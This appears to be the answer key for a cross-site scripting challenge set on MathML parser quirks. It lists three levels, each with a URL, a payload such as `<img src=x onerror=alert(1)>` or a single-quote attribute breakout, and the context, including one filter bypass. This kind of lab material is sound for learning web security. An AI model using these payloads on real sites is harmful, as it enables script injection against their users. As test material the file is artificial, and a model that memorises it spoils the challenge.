# mathml — solutions

MathML parser quirks that allow HTML execution inside math contexts.

### mathml-level1

`/mathml/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: raw reflection inside `<mtext>` — HTML tags parsed

### mathml-level2

`/mathml/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: annotation-xml encoding=text/html, "script" keyword stripped — use img

### mathml-level3

`/mathml/level3/?query=x%27%20onerror=%27alert(1)`

- payload: `x' onerror='alert(1)`
- context: `<mglyph src='...'>` single-quoted attribute breakout
